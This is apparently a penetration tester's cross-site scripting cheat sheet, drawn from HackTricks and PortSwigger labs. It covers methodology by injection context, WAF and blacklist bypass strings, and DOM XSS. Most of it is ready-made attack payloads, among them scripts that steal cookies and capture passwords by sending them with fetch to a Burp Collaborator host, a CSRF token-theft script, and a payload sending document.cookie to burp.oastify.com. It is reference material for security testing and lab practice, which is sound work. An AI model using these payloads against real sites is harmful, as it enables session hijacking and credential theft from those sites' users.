# Methodology  
From : [HackTricks](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting)
1. Check:
    1. Verify if any value you control (parameters, path, headers, cookies) is reflected in the HTML or used by JavaScript code.
    2. Identify the context where it is reflected/used.

2. If reflected
    1. **[In raw HTML](https://github.com/d41ki-3/PenetrationTestCheatsheet##In%20raw%20HTML)**:
        1. Can you create new HTML tags?  
        2. Can you use events or attributes supporting `javascript:` protocol?
        3. Can you bypass protections?
        4. If the HTML content is interpreted by any client-side JS engine (e.g., AngularJS, VueJS, Mavo), you could exploit a Client-Side Template Injection.  
        5. If you cannot create HTML tags that execute JS code, could you exploit a Dangling Markup - HTML scriptless injection?  
    2.  **Inside a HTML tag**:  
        1. Can you exit to raw HTML context?  
        2. Can you create new events/attributes to execute JS code?  
        3. Does the attribute where you are trapped support JS execution?  
        4. Can you bypass protections?  
    3.  **Inside JavaScript code**:
        1. Can you escape the `<script>` tag?  
        2. Can you escape the string and execute different JS code?  
        3. Is your input in template literals ``?  
        4. Can you bypass protections?  
    5.  **Javascript function being executed**:  
        1. Can you specify the function name to execute, e.g., `?callback=alert(1)`?

3. If used:  
    1. You could exploit a DOM XSS. Pay attention to how your input is controlled and if your controlled input is used by any sink.  


---
## In raw HTML  
- If your input is reflected in the HTML page or you can escape and inject HTML code in this context, first check if you can use < to create new tags. Reflect this character to see if it's HTML encoded, deleted, or reflected unchanged.  
- If reflected in a tag attribute value, introduce HTML tags to trigger JavaScript execution.  
- Some useful methods for executing JavaScript include:  
```
<script>alert(document.domain)</script>
<img src=1 onerror=alert(1)>
```
- If your input is reflected on the raw HTML page you will need to abuse some HTML tag in order to execute JS code: `<img , <iframe , <svg , <script` 


### Tags/Events brute-force  
- Check if any tags wasn't discovered as malicious by the WAF. Once you have discovered which tags you can use, you can brute force all the events using the valid tags  


### Custom tags  
- If you didn't find any valid HTML tag, you could try to create a custom tag and and execute JS code with the onfocus attribute. In the XSS request, you need to end the URL with `#` to make the page focus on that object and execute the code  

### Blacklist Bypasses  
- If some kind of blacklist is being used you could try to bypass it with some silly tricks:
```
//Random capitalization
<script> --> <ScrIpT>
<img --> <ImG

//Double tag, in case just the first match is removed
<script><script>
<scr<script>ipt>
<SCRscriptIPT>alert(1)</SCRscriptIPT>

//You can substitude the space to separate attributes for:
/
/*%00/
/%00*/
%2F
%0D
%0C
%0A
%09

//Unexpected parent tags
<svg><x><script>alert('1'&#41</x>

//Unexpected weird attributes
<script x>
<script a="1234">
<script ~~~>
<script/random>alert(1)</script>
<script      ///Note the newline
>alert(1)</script>
<scr\x00ipt>alert(1)</scr\x00ipt>

//Not closing tag, ending with " <" or " //"
<iframe SRC="javascript:alert('XSS');" <
<iframe SRC="javascript:alert('XSS');" //

//Extra open
<<script>alert("XSS");//<</script>

//Just weird an unexpected, use your imagination
<</script/script><script>
<input type=image src onerror="prompt(1)">

//Using `` instead of parenthesis
onerror=alert`1`

//Use more than one
<<TexTArEa/*%00//%00*/a="not"/*%00///AutOFocUs////onFoCUS=alert`1` //
```

In case :  

1. Reflected XSS into HTML context with most tags and attributes blocked
>BruteForce all tags by using portswigger list: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet Find out, that payload gives 200 status. Use the next payload, to send it to victim:
```
<iframe src="https://YOUR-LAB-ID.web-security-academy.net/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'>
```
2. Reflected XSS into HTML context with all tags blocked except custom ones  
>In case blocks all HTML tags except custom ones, to send it to victim:
```
<script>
location = 'https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cxss+id%3Dx+onfocus%3Dalert%28document.cookie%29%20tabindex=1%3E#x';
</script>
```
3. Reflected XSS with some SVG markup allowed  
```
<svg><animatetransform onbegin=alert(1)> 
```
## In HTML tags attribute  
If your input is reflected inside the value of the attribute of a tag you could try:
1. you might sometimes be able to terminate the attribute value, close the tag, and introduce a new one.
```
"><script>alert(document.domain)</script>
```
2. If you can escape from the attribute but not from the tag (`>` is encoded or deleted), depending on the tag you could create an event that executes JS code:
```
" autofocus onfocus=alert(document.domain) x="
```
3. If you cannot escape from the attribute (`"` is being encoded or deleted), then depending on which attribute your value is being reflected in if you control all the value or just a part you will be able to abuse it. For example, if you control an event like `onclick=` you will be able to make it execute arbitrary code when it's clicked. Another interesting example is the attribute `href`, where you can use the `javascript:` protocol to execute arbitrary code: 
```
<a href="javascript:alert(document.domain)">
```
4. If your input is reflected inside *"unexpoitable tags"* you could try the `accesskey` trick to abuse the vuln (you will need some kind of social engineer to exploit this): 
```
" accesskey="x" onclick="alert(1)" x="
```

## In JavaScript code  
### Escaping the <script> Tag:
  
  If your code is inserted within a `<script> [...] var input = 'reflected data' [...] </script>` you can escape by closing the `<script>` tag.   
  The browser parses HTML first, identifying elements and script blocks, before executing the JavaScript. Hence, you don't need to close the single quote in the example.
```
 </script><img src=1 onerror=alert(document.domain)>.
```

### Inside JS code  
If the XSS context is inside a quoted string literal, you can break out of the string and execute JavaScript directly, even if `< >` are sanitized. It is essential to maintain correct JavaScript syntax, as any errors will prevent the script from executing.
```
'-alert(document.domain)-'
';alert(document.domain)//
\';alert(document.domain)//
```


### HTML-encoding  
When the XSS context is within a quoted tag attribute in existing JavaScript, you can use HTML-encoding to bypass input filters.   
Browsers HTML-decode attribute values before processing, allowing you to circumvent server-side sanitization.   
For example, if single quotes are blocked, using `&apos;` (HTML entity for a single quote) can help you break out of the JavaScript string and execute your script.  
```
&apos;-alert(document.domain)-&apos;
```

### Template literals ``  
In order to construct strings apart from single and double quotes JS also accepts backticks ``  
If reflected inside template literals you can embed JS expressions using ${ ... } syntax: var greetings = `Hello, ${alert(1)}`
```
`${alert(1)}`
`${`${`${`${alert(1)}`}`}`}`
```


# Exploiting cross-site scripting vulnerabilities  
1. To steal cookies  
```
<script>
fetch('https://BURP-COLLABORATOR-SUBDOMAIN', {
method: 'POST',
mode: 'no-cors',
body:document.cookie
});
</script>
```
2. To capture passwords  
``` 
<input name=username id=username>
<input type=password name=password onchange="if(this.value.length)fetch('https://BURP-COLLABORATOR-SUBDOMAIN',{
method:'POST',
mode: 'no-cors',
body:username.value+':'+this.value
});">
```
3. To perform CSRF  
```
<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/my-account',true);
req.send();
function handleResponse() {
    var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/my-account/change-email', true);
    changeReq.send('csrf='+token+'&email=test@test.com')
};
</script>
```
# DOM-Base  
[HackTricks-DOM](https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss)  
DOM vulnerabilities occur when data from attacker-controlled sources (like location.search, document.referrer, or document.cookie) is unsafely transferred to sinks. Sinks are functions or objects (e.g., eval(), document.body.innerHTML) that can execute or render harmful content if given malicious data.  

・**Sources** are inputs that can be manipulated by attackers, including URLs, cookies, and web messages.  

・**Sinks** are potentially dangerous endpoints where malicious data can lead to adverse effects, such as script execution.  

The risk arises when data flows from a source to a sink without proper validation or sanitation, enabling attacks like XSS.  


## DOM XSS  
DOM-based XSS vulnerabilities occur when JavaScript takes data from an attacker-controllable source, like the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML.  
This allows attackers to execute malicious JavaScript, potentially hijacking users' accounts.  

To execute a DOM-based XSS attack, attackers need to place data into a source that propagates to a sink, leading to arbitrary JavaScript execution. The most common source is the URL, accessed with the window.location object.   
Attackers can send victims to a vulnerable page with a payload in the query string or fragment portions of the URL.  

In some cases, like targeting a 404 page or a PHP site, the payload can also be placed in the path.  

In principle, a website is vulnerable to DOM-based cross-site scripting if there is an executable path via which data can propagate from source to sink.   

## Others  
The innerHTML sink doesn't accept script elements on any modern browser, nor will svg onload events fire.   
This means you will need to use alternative elements like img or iframe. Event handlers such as onload and onerror can be used in conjunction with these elements.   For example:   
```
element.innerHTML='... <img src=1 onerror=alert(document.domain)> ...'
```

## DOM Invader  
To breifly find DOM XSS by using DOM Invader in Burp browser with extension.  
[DOM Invader doc](https://portswigger.net/burp/documentation/desktop/tools/dom-invader)   

# Examples  
1. DOM XSS in document.write sink using source location.search inside a select element  
```
storeId=test"></select><script>alert(1)</script>

"></select><script>document.location='http://burp.oastify.com/?c='+document.cookie</script>
```
2. AngularJS  
```
{{$on.constructor('alert(1)')()}}
```  
3. Reflected DOM XSS  
```
\"-alert()}//
```
4. Stored DOM XSS  
```
<><img src=1 onerror=alert(1)>
```
